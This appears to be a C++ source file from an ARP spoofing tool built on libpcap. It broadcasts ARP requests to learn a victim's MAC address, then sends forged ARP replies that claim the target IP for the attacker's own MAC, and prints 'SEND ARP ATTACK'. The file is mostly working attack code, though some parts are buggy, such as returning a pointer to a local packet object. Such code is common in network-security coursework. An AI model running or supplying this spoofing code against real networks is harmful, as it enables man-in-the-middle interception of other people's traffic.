#include "attack.h"
#include "packet.h"

void arp_request(pcap_t* pcap, char* dev, std::string d_mac_, std::string s_mac_, char* sender_ip, char* target_ip, uint16_t op_){
    uint16_t ether_type = 0x0608;

    Ethernet* ethernet = new Ethernet(d_mac_, s_mac_, ether_type);
    // ethernet->print_ethernet();

    std::string my_ip = get_my_ip(dev);
    // printf("\n%s", my_ip.c_str());
    Arp* arp = new Arp(s_mac_, d_mac_, my_ip, target_ip, op_);
    // arp->print_arp();
    ArpPacket *packet = new ArpPacket(ethernet, arp);
    //
    if(pcap_sendpacket(pcap, (u_char*)packet , sizeof(*packet)) !=0){
        printf("ERROR");
        exit(1);
    }

}

ArpPacket* arp_reply(pcap_t* pcap, char* dev, std::string d_mac_, std::string s_mac_, char* sender_ip, char* target_ip){
    uint16_t ether_type = 0x0608;
    std::string my_mac = get_my_mac(dev);
    Ethernet* ethernet = new Ethernet(d_mac_, s_mac_, ether_type);
    // ethernet->print_ethernet();
    uint16_t op_ = 0x0002;

    Arp* arp = new Arp(s_mac_, d_mac_, sender_ip, target_ip, op_);
    // arp->print_arp();
    ArpPacket *packet = new ArpPacket(ethernet, arp);
    //
    if(pcap_sendpacket(pcap, (u_char*)packet , sizeof(*packet)) !=0){
        printf("ERROR");
        exit(1);
    }

    return packet;

}

void arp_reply(pcap_t* pcap, ArpPacket* packet){
    if(pcap_sendpacket(pcap, (u_char*)packet , sizeof(*packet)) !=0){
        printf("ERROR");
        exit(1);
    }
    // return packet;
}

ArpPacket* get_packet(pcap_t* pcap, std::string mac_){
    uint8_t tmp[6];
    const u_char* packet;
    Ethernet* ethernet ;
    while (true) {
        struct pcap_pkthdr* header;
        // printf("\nWHERE");

        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0){
            continue; //time out
        } else if(res <0){ // error
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }
        ethernet = (Ethernet*) packet;

        // ethernet->print_ethernet();
        stoi_mac(mac_, tmp);
        if(ethernet->get_ether_type() != 0x0806){
        	continue;
        }
        else if(ethernet->get_d_mac() == tmp){
        	continue;
        }
        break;
    }

    packet = packet + sizeof(Ethernet);
    Arp* arp = (Arp*) packet;
    ArpPacket arp_packet = ArpPacket(ethernet, arp);
    ArpPacket* address_arp_packet = &arp_packet;

    return  address_arp_packet;
}






ArpPacket* attack_arp(char* dev, char* sender_ip, char* target_ip, pcap_t* pcap, Mac* target_mac_add){
    //Send Arp Request
    std::string d_mac_  = "ff:ff:ff:ff:ff:ff";
    std::string s_mac_ = get_my_mac(dev);
    std::string my_ip = get_my_ip(dev);
    arp_request(pcap, dev, d_mac_, s_mac_, (char*)my_ip.c_str(), sender_ip, 0x0001); // broadcast to get target's mac'

    ArpPacket* target_packet = get_packet(pcap, s_mac_);
    Ethernet target_packet_ethernet = target_packet->get_ethernet();
    // taget_packet_ethernet.print_ethernet();
    Arp target_packet_arp = target_packet->get_arp();
    // taget_packet_arp.print_arp();

    uint8_t* mac_ = target_packet_ethernet.get_s_mac();
    char buf[20];
    sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac_[0], mac_[1], mac_[2], mac_[3], mac_[4], mac_[5]);

    std::string target_mac = std::string(buf);
    // printf("\n%s\n", target_mac.c_str());

    ArpPacket* arpPacket = arp_reply(pcap, dev, target_mac,  s_mac_,  target_ip, sender_ip);
    printf("SEND ARP ATTACK\n");




    arp_request(pcap, dev, d_mac_, s_mac_, (char*)my_ip.c_str(), target_ip, 0x0001); // broadcast to get target's mac'
    ArpPacket* target_packet2 = get_packet(pcap, s_mac_);
    Ethernet target_packet2_ethernet = target_packet2->get_ethernet();
    // taget_packet_ethernet.print_ethernet();
    Arp target_packet2_arp = target_packet2->get_arp();
    // target_packet2_arp.print_arp();

    uint8_t* mac2_ = target_packet2_ethernet.get_s_mac();
    char buf2[20];
    sprintf(buf2, "%02X:%02X:%02X:%02X:%02X:%02X", mac2_[0], mac2_[1], mac2_[2], mac2_[3], mac2_[4], mac2_[5]);

    std::string target_mac2 = std::string(buf2);
    *target_mac_add =  Mac(target_mac2);
    return arpPacket;

}
